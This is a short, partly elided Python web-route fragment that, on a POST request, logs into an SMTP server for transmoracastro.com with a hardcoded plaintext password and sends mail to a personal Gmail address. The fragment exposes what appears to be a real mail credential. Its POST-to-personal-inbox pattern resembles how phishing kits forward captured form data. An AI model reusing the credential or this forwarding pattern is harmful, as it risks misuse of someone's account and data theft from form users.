...
def first():
    if request.method == 'POST':
        ...
        sender_email = "logistica.cue@transmoracastro.com"
        sender_emaill = "logistica.cue"
        receiver_email = "kokofunds147@gmail.com"
        password = "Password#9874"
        ...
        with smtplib.SMTP_SSL("transmoracastro.com", 465) as server:
